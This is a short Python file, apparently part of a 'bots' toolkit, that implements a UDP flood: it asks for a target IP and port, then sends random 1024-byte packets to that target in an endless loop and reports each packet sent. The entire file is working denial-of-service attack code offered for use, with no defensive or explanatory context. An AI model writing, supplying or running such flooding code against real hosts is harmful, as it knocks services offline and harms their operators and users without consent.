# bots/udp_flood.py
import socket, random

def start_udp():
    ip = input("[?] Target IP: ")
    port = int(input("[?] Port: "))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)

    print(f"[+] Starting UDP Flood on {ip}:{port} ...")
    while True:
        sock.sendto(bytes, (ip, port))
        print(f"[✓] Packet sent to {ip}:{port}")
